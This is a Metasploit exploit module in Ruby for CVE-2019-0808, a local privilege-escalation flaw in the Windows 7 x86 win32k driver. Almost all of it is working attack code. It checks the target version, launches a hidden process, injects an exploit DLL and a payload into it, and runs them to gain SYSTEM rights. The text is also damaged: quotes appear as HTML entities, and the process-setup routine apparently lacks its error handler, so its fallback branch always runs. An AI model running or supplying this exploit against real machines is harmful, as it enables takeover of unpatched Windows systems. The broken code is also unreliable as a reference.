# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core/post/file&#039;
require &#039;msf/core/exploit/exe&#039;
require &#039;msf/core/post/windows/priv&#039;

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::FileInfo
  include Msf::Post::Windows::ReflectiveDLLInjection
  include Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
        update_info(
            info,
            &#039;Name&#039; => &#039;Microsoft Windows NtUserMNDragOver Local Privilege Elevation&#039;,
            &#039;Description&#039; => %q{
               This module exploits a NULL pointer dereference vulnerability in
               MNGetpItemFromIndex(), which is reachable via a NtUserMNDragOver() system call.

               The NULL pointer dereference occurs because the xxxMNFindWindowFromPoint()
               function does not effectively check the validity of the tagPOPUPMENU
               objects it processes before passing them on to MNGetpItemFromIndex(),
               where the NULL pointer dereference will occur.

               This module has been tested against Windows 7 x86 SP0 and SP1. Offsets
               within the solution may need to be adjusted to work with other versions
               of Windows, such as Windows Server 2008.
        },
            &#039;License&#039; => MSF_LICENSE,
            &#039;Author&#039; =>
                [
                    &#039;ClÃ©ment Lecigne&#039;, # discovery
                    &#039;Grant Willcox&#039;, # exploit
                    &#039;timwr&#039; # msf module
                ],
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039; =>
                [
                    [&#039;Windows 7 x86&#039;, { &#039;Arch&#039; => ARCH_X86 }]
                ],
            &#039;SideEffects&#039; => [SCREEN_EFFECTS],
            &#039;References&#039; =>
                [
                    [&#039;CVE&#039;, &#039;2019-0808&#039;],
                    [&#039;URL&#039;, &#039;https://github.com/exodusintel/CVE-2019-0808&#039;],
                    [&#039;URL&#039;, &#039;https://github.com/ze0r/cve-2019-0808-poc&#039;],
                    [&#039;URL&#039;, &#039;http://blogs.360.cn/post/RootCause_CVE-2019-0808_EN.html&#039;],
                    [&#039;URL&#039;, &#039;https://blog.exodusintel.com/2019/05/17/windows-within-windows/&#039;],
                ],
            &#039;DisclosureDate&#039; => &#039;Mar 12 2019&#039;,
            &#039;DefaultTarget&#039; => 0
        )
    )
    register_options([
                         OptString.new(&#039;PROCESS&#039;, [true, &#039;Name of process to spawn and inject dll into.&#039;, &#039;notepad.exe&#039;])
                     ])
  end

  def setup_process
    process_name = datastore[&#039;PROCESS&#039;]
    begin
      print_status("Launching #{process_name} to host the exploit...")
      launch_process = client.sys.process.execute(process_name, nil, &#039;Hidden&#039; => true)
      process = client.sys.process.open(launch_process.pid, PROCESS_ALL_ACCESS)
      print_good("Process #{process.pid} launched.")
      # Sandboxes could not allow to create a new process
      # stdapi_sys_process_execute: Operation failed: Access is denied.
      print_error(&#039;Operation failed. Trying to elevate the current process...&#039;)
      process = client.sys.process.open
    end
    process
  end

  def check
    sysinfo_value = sysinfo[&#039;OS&#039;]

    if sysinfo_value !~ /windows/i
      # Non-Windows systems are definitely not affected.
      return CheckCode::Safe
    end

    build_num = sysinfo_value.match(/\w+\d+\w+(\d+)/)[0].to_i
    vprint_status("Windows Build Number = #{build_num}")
    # see https://docs.microsoft.com/en-us/windows/release-information/
    unless sysinfo_value =~ /7/ && (build_num >= 7600 && build_num <= 7601)
      print_error(&#039;The exploit only supports Windows 7 versions 7600 and 7601&#039;)
      return CheckCode::Safe
    end

    path = expand_path(&#039;%WINDIR%\\system32\\win32k.sys&#039;)
    major, minor, build, revision, brand = file_version(path)
    return CheckCode::Safe if revision >= 24387

    CheckCode::Appears
  end

  def exploit
    super

    if is_system?
      fail_with(Failure::None, &#039;Session is already elevated&#039;)
    end

    if sysinfo[&#039;Architecture&#039;] != ARCH_X86
      fail_with(Failure::NoTarget, &#039;Running against 64-bit systems is not supported&#039;)
    end

    process = setup_process
    library_data = exploit_data(&#039;CVE-2019-0808&#039;, &#039;exploit.dll&#039;)
    print_status("Injecting exploit into #{process.pid} ...")
    exploit_mem, offset = inject_dll_data_into_process(process, library_data)
    print_status("Exploit injected. Injecting payload into #{process.pid}...")
    encoded_payload = payload.encoded
    payload_mem = inject_into_process(process, [encoded_payload.length].pack(&#039;I<&#039;) + encoded_payload)

    # invoke the exploit, passing in the address of the payload that
    # we want invoked on successful exploitation.
    print_status(&#039;Payload injected. Executing exploit...&#039;)
    process.thread.create(exploit_mem + offset, payload_mem)
  end
end

